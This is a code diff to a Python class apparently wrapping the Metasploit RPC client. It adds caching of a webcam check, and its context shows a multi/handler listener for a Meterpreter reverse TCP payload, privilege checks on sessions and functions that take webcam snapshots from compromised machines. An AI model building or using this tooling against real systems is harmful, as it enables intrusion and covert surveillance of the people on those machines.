@@ -41,9 +41,14 @@ class MsfToolbox:
         # Live stream if off at the beginning
         self.disable_streaming_flag()
 
+        # Webcam flag
+        self._has_webcam = -1
+
+
     def init_client(self):
         self._client = MsfRpcClient(self._password, port=self._port)
         self._console = self._client.consoles.console()
+
 
     def exploit_multi_handler(self, lport=4444, payload='windows/x64/meterpreter/reverse_tcp'):
         exploit = self._client.modules.use('exploit', 'multi/handler')
@@ -157,14 +162,18 @@ class MsfToolbox:
         is_system = self.is_system(session)
         return data, is_admin, is_system
 
-        
+
     # Webcam snapshots
 
     def has_webcam(self, session):
-        shell = self.get_session_shell(session)
-        return webcam.has_webcam(shell)
+        """ Only compute it the first time """
+        if (self._has_webcam == -1):
+            shell = self.get_session_shell(session)
+            self._has_webcam = webcam.has_webcam(shell)
 
-        
+        return self._has_webcam
+
+
     def post_take_snapshot(self, session):
         shell = self.get_session_shell(session)
         snapshot_path = media.get_media_path(session, "snapshots")
@@ -172,7 +181,7 @@ class MsfToolbox:
         # Take snapshot
         webcam.post_take_snapshot(shell, snapshot_path)
 
-        
+
     def get_snapshots_url(self, session):
         return media.get_medias_url(session, "snapshots")
 
